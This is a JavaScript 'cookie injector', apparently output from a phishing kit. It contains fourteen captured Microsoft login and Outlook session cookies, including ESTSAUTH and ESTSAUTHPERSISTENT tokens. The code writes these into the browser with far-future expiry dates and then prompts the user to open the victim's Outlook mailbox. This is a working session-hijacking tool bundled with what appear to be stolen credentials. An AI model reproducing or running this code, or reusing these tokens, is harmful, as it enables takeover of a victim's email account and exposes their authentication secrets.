
// Enhanced Microsoft Authentication Cookie Injector
// Auto-generated on 2025-09-07T10:59:02.770Z
// Email: unknown

(function() {
    console.log('🚀 Injecting 14 persistent Microsoft auth cookies...');

    const cookies = [
    {
        "name": "SuiteServiceProxyKey",
        "value": "fp9Daxe9MmiNTAP7ivwnRE5v49YrgpUflwi1WSQr1kc=&Xly+D1G5UeeC2U1Icx4Zsg==",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1914922742,
        "size": 89,
        "httpOnly": false,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "luat",
        "value": "L9mXuujyXcHPJXA6Gp3T5bcEDQ59mdlnP01oCs4+yMVxEjMskRSX1BAGYeacHTvahaAxJVYeW6Lencny6dJeP3YTx34/IVcqOSFVvmaT/g2zUmk6erNS38DOFifUo/JxSALet1EI+Il+hfjiXYeemj04XiJmSatkJAOjjj0UVNynhJ0QSH7sq8roPxa5VbvrCN+4OjYsItJ3kibB6S+IhrPfTcoRmtdMuhWaeQdwT3nH+C+OBnG0JAzbPl+Zau0vb7lwC4DtXX+Y4urTetDPg7EZTK9eQePepVbybawmf5wiw8nBXdD0LCUlGNHK5L8Ihln58zS1miR7pBXMhZShNw==",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1914922742,
        "size": 348,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "OWAAppIdType",
        "value": "Exchange",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1914922742,
        "size": 20,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "esctx-0yWLxYwT80E",
        "value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEvWPPpw2Xk4Alhcp9otVk_ZYZ_ZV80dd8xErJ8JwLGF0fF_hmxS4wlbpUhKYyS3k9-wHFbpZ_S_mUNjUbyaDL9LTEOpcGoKyYGClDD3wQZg027VKIyXBflAjxDzy2ajeTPlrYq2q-23EvSNwA03c4LiAA",
        "domain": ".login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 201,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "buid",
        "value": "1.AToAalx3KW4t70Km6j4KRnk2GSC_mZE_oQdBhdwCEUeH70gBAAA6AA.AQABGgEAAABVrSpeuWamRam2jAF1XRQE9hG11JwAEUDA3R2reHdA1MRf8NuLTA6hxFo_P6J7CtJ3Wz82YRnWLekjm30Zvkqsa4QeLP6zAttat7cgcWqucF9_cyQ4kBwh_0hR8KdLILRRkI1NwpY96EAB5JlXqT95QFCvN5aaVhrfjBHtMUNntMGvjo2AHWEPYhyJdhIB1LggAA",
        "domain": "login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 267,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "ESTSAUTH",
        "value": "1.AToAalx3KW4t70Km6j4KRnk2GSC_mZE_oQdBhdwCEUeH70gBAAA6AA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P9Iev-irLMLuZyqUsiByKSLjC0LD5NSx_3lCXzpuPwLSQddKkbGuNSUrkq6DOR_qvDK0vku7F4FMWha",
        "domain": ".login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 185,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "ESTSAUTHPERSISTENT",
        "value": "1.AToAalx3KW4t70Km6j4KRnk2GSC_mZE_oQdBhdwCEUeH70gBAAA6AA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P95BUvykHNEnBPwyz-zK1XGT_RpaWyP77kqElnqUG6aBkAWKTQCzHPEM3knFGJO0i4rEGT5U1JEiV6dAqbkJ9fthW_845e-P-R-oSWdJTw7Oog2upoPmlSZMcVMCj1U3poAJ3dVPXrn3pdYahPdRSxt963IQpTh8DlFY4k2WPabCqxGyG5684PBjszOwEYMnt9vdmgAoN1Jc2RokxLNDT3yuQz33bdJ6dUJ_-hSWBgq7hoVyhKZ5BcxUUbl-VT4GXoU8eV64f4iIVsm2sypVAjQqDcX8yEI6Ayx8BQqc50IjJ-OYOFHWuwFiIDxSNaqUVbbxfRXP7Ot-ap31t4Nkhjfq5o8qdDz7mmqfTTNOURuFhxAi8xvhO1iWxGNL4pkasTk9UUUx0xtt3UVqlcEmAi1SXNI6tcUKn840k40q5Hu6Iykwlh7a5w_vwxygisOSlABCaYCbscOBNMJWdP0AfFXmUZ0hsZBaeKpsBCn1K-o-Y7Fog4B5VtvUSOGMtKjaGct2opY1Jt4uPSK69Ux93eXAuEZ8qTCjKkjdtGdZef6v9revDO3MOG_2LWsv0VMc95nASEK",
        "domain": ".login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 699,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "esctx-tIsCN7SHS3w",
        "value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEV3JkeGIR3ls-J5YUL6BldQjcDGqtBpeKBzcJHQTPwGGshdpaumTIcB3mW2Z5GkVR5jZEggE3KZ-FHwacblBykfDeQwPZP-4iC02wWXQzyxv6rarA5IpC2yiwSfEK_X3U-UvfvkpwWjs8Tzu2aT77cyAA",
        "domain": ".login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 201,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "esctx-SIZQR9z8hs",
        "value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEtSr5QVjL9-3dFJQgTG7LW1Vd82k_ZGs5G2HNlE01mEUMPUqqWrrMGRAdRek6oSQwYNLPM85QJ5ciHl5wFJ4oTL0n10nR1lBJZEaN4VC9VDXErEFgWpspfOAv9NI2buo3rxP95pAGVWlycjcVFyiJGCAA",
        "domain": ".login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 200,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "esctx-hz4vlSVugJo",
        "value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQE1MjybpaCVkaE6DrGpTyrXrSBF6bOXbdY6dzjY2ZWAGTkKgu-3RY8XRSodxmtRmDP2mNrTPYbQQl1JterOTMpTL3lSFA9L7_vgw-XvvGW12lwY_eYC3icONoqEhKONWUfSApg1CGpLNDCBlOFlaD07yAA",
        "domain": ".login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 201,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "esctx-upyA0sTLrmU",
        "value": "AQABCQEAAABVrSpeuWamRam2jAF1XRQEVPqEcPeP3Ed337lRRGpxft28SWgvjhGpOVDy0Uv4ky2Yeh7YolDA7GSccBvq16GQWNCJnUva5Q6oPJwVucd308x8Yevf716-G4i0iiNEowdqhYwOtfE-txO34GL_aEq4TYThpHSXGRTFsPJN7HnXqCAA",
        "domain": ".login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 201,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "stsservicecookie",
        "value": "estsfd",
        "domain": "login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 22,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "x-ms-gateway-slice",
        "value": "estsfd",
        "domain": "login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 24,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "fpc",
        "value": "Ak0haTXvkzJOqGBBoFpnxysgV5gUAQAAAG5cT-AOAAAAa4gK1QEAAABiXE_gDgAAALTBvssBAAAAZ1xP4A4AAAA",
        "domain": "login.microsoftonline.com",
        "path": "/",
        "expires": 1914922742,
        "size": 90,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    }
];
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' auth cookies! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();